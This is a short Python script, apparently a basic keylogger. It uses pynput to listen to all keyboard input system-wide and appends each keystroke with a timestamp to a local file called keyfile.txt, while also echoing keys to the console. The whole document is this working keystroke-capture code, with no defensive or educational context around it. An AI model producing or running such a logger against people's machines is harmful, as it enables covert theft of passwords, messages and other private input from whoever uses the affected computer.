from pynput import keyboard
from datetime import datetime
 
def keyPressed(key):    #Handles key press events, logs the key pressed along with the timestamp.
     
     print(str(key))  # Print the key pressed for debugging
     with open("keyfile.txt", 'a') as logKey:
         try:
             # Log printable character keys with timestamp
             char = key.char
             logKey.write(f"{datetime.now()} - {char}\n")
         except AttributeError:
             # Log special keys with timestamp in brackets
             logKey.write(f"{datetime.now()} - [{str(key)}]\n")
 
if __name__ == "__main__":
     # Initialize the key listener
     listener = keyboard.Listener(on_press=keyPressed)
     listener.start()  # Start listening
     input()  # Keep the script running
 
 
